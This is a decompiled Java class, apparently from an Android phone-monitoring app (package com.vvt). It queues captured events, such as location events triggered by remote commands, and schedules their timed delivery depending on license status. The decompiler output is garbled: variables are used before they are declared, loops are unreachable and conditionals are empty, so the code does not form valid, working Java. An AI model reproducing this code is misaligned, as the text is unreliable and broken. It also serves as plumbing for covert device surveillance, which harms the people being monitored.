package com.vvt.appengine;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventType;
import com.vvt.eventdelivery.EventDelivery;
import com.vvt.eventrepository.c;
import com.vvt.events.FxLocationCallingModule;
import com.vvt.events.FxLocationEvent;
import com.vvt.exceptions.database.FxDatabaseException;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class q
  implements com.vvt.base.a
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.c;
  private static final boolean c = com.vvt.ak.a.e;
  private c d;
  private EventDelivery e;
  private Timer f;
  private TimerTask g;
  private boolean h;
  private int i;
  private int j;
  private com.vvt.license.a k;
  
  public q(c paramc, EventDelivery paramEventDelivery, com.vvt.license.a parama)
  {
    this.d = paramc;
    this.e = paramEventDelivery;
    this.k = parama;
    this.h = m;
    this.i = 10;
    this.j = m;
  }
  
  private boolean b(List paramList)
  {
    Iterator localIterator = paramList.iterator();
    Object localObject;
    FxLocationCallingModule localFxLocationCallingModule;
    do
    {
      boolean bool2;
      do
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = (FxEvent)localIterator.next();
        bool2 = localObject instanceof FxLocationEvent;
      } while (!bool2);
      localObject = ((FxLocationEvent)localObject).getCallingModule();
      localFxLocationCallingModule = FxLocationCallingModule.MODULE_REMOTE_COMMAND;
    } while (localObject != localFxLocationCallingModule);
    boolean bool1 = true;
    for (;;)
    {
      return bool1;
      bool1 = false;
      localObject = null;
    }
  }
  
  public void a()
  {
    b();
    boolean bool1 = this.h;
    if (bool1)
    {
      int m = this.j;
      if (m > 0)
      {
        Object localObject = new com/vvt/appengine/r;
        ((r)localObject).<init>(this);
        this.g = ((TimerTask)localObject);
        boolean bool2 = a;
        if (bool2) {}
        int n = this.j * 60 * 60 * 1000;
        long l = n;
        localObject = new java/util/Timer;
        ((Timer)localObject).<init>();
        this.f = ((Timer)localObject);
        localObject = this.f;
        TimerTask localTimerTask = this.g;
        ((Timer)localObject).schedule(localTimerTask, l, l);
      }
    }
    for (;;)
    {
      return;
      boolean bool3 = a;
      if (!bool3) {}
    }
  }
  
  public void a(int paramInt)
  {
    this.i = paramInt;
  }
  
  public void a(List paramList)
  {
    boolean bool1;
    if (paramList != null)
    {
      int m = paramList.size();
      if (m > 0)
      {
        bool1 = b;
        if (bool1)
        {
          localObject1 = paramList.iterator();
          for (;;)
          {
            bool1 = ((Iterator)localObject1).hasNext();
            if (!bool1) {
              break;
            }
            localObject2 = (FxEvent)((Iterator)localObject1).next();
          }
        }
      }
    }
    try
    {
      localObject2 = this.d;
      ((c)localObject2).a(paramList);
      bool1 = a;
      if (!bool1) {}
    }
    catch (FxDatabaseException localFxDatabaseException)
    {
      for (;;)
      {
        try
        {
          boolean bool3;
          localObject2 = paramList.get(0);
          localObject2 = (FxEvent)localObject2;
          localObject2 = ((FxEvent)localObject2).getEventType();
          localObject1 = s.a;
          int n = ((FxEventType)localObject2).ordinal();
          n = localObject1[n];
          switch (n)
          {
          default: 
            localObject2 = this.d;
            n = ((c)localObject2).d();
            bool3 = a;
            if (bool3) {}
            int i1 = this.i;
            if (n < i1) {
              continue;
            }
            bool2 = a;
            if (bool2) {}
            localObject2 = this.e;
            ((EventDelivery)localObject2).a();
            return;
          }
        }
        catch (Exception localException)
        {
          EventDelivery localEventDelivery1;
          bool2 = c;
          if (!bool2) {
            continue;
          }
          continue;
          bool2 = a;
          if (!bool2) {
            continue;
          }
          EventDelivery localEventDelivery2 = this.e;
          localEventDelivery2.c();
          continue;
          bool2 = a;
          if (!bool2) {
            continue;
          }
          localEventDelivery2 = this.e;
          localEventDelivery2.b();
          continue;
          bool2 = a;
          if (!bool2) {
            continue;
          }
          localEventDelivery2 = this.e;
          localEventDelivery2.e();
          continue;
          bool2 = b(paramList);
          if (!bool2) {
            continue;
          }
          bool2 = a;
          if (!bool2) {
            continue;
          }
          localEventDelivery2 = this.e;
          localEventDelivery2.a();
          continue;
          bool2 = a;
          if (!bool2) {
            continue;
          }
          continue;
        }
        localFxDatabaseException = localFxDatabaseException;
        boolean bool2 = c;
        if (bool2)
        {
          continue;
          bool2 = a;
          if (bool2) {}
          localEventDelivery1 = this.e;
          localEventDelivery1.d();
          continue;
          bool2 = a;
          if (!bool2) {}
        }
      }
    }
    localObject2 = this.k.a().getLicenseStatus();
    bool3 = this.h;
    if (bool3)
    {
      localObject1 = LicenseStatus.NOT_ACTIVATED;
      if (localObject2 != localObject1)
      {
        bool1 = false;
        localObject2 = null;
      }
    }
  }
  
  public void a(boolean paramBoolean)
  {
    this.h = paramBoolean;
  }
  
  public void b()
  {
    Object localObject = this.g;
    if (localObject != null)
    {
      localObject = this.g;
      ((TimerTask)localObject).cancel();
      this.g = null;
    }
    localObject = this.f;
    if (localObject != null)
    {
      localObject = this.f;
      ((Timer)localObject).cancel();
      this.f = null;
    }
  }
  
  public void b(int paramInt)
  {
    this.j = paramInt;
  }
  
  public boolean c()
  {
    return this.h;
  }
  
  public int d()
  {
    return this.j;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/q.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */